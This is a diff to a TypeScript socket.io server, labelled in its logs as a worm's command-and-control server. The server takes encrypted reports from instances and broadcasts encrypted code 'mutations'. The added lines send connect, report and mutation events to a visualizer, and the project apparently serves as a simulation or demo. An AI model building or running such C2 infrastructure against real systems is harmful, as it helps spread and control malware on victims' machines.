@@ -39,6 +39,13 @@ app.post('/api/report', (req: Request, res: Response) => {
             throw new Error('Decryption failed, payload may be malformed or key is incorrect.');
         }
         logger.info(`C2 Server: Received valid report from instance ${instanceId}: ${JSON.stringify(decryptedReport)}`);
+        
+        // VISUALIZER EVENT: Notify UI about the received report.
+        io.emit('worm_event', {
+            type: 'report',
+            instanceId,
+            data: decryptedReport,
+        });
 
         // This simulates the "tasking" part. Based on the report, we broadcast a mutation to all connected clients.
         // Select a random mutation from our library to broadcast.
@@ -51,6 +58,13 @@ app.post('/api/report', (req: Request, res: Response) => {
         
         // Broadcast the encrypted payload and the key needed to decrypt it.
         io.emit('update', { payload: encryptedCode, key });
+        
+        // VISUALIZER EVENT: Notify UI about the broadcasted mutation.
+        io.emit('worm_event', {
+            type: 'mutation',
+            instanceId,
+            data: { mutation: selectedMutation.substring(0, 100) + '...' } // Send a snippet
+        });
 
         res.status(200).json({ message: 'Report received and mutation broadcasted.' });
 
@@ -62,8 +76,22 @@ app.post('/api/report', (req: Request, res: Response) => {
 
 io.on('connection', (socket) => {
     logger.info(`C2 Server: Client connected: ${socket.id}`);
+    
+    // VISUALIZER EVENT: Notify UI a new worm has connected.
+    io.emit('worm_event', {
+        type: 'connect',
+        instanceId: socket.id,
+        data: { wormCount: io.engine.clientsCount }
+    });
+
     socket.on('disconnect', () => {
         logger.info(`C2 Server: Client disconnected: ${socket.id}`);
+        // VISUALIZER EVENT: Notify UI a worm has disconnected.
+        io.emit('worm_event', {
+            type: 'disconnect',
+            instanceId: socket.id,
+            data: { wormCount: io.engine.clientsCount }
+        });
     });
 });
 
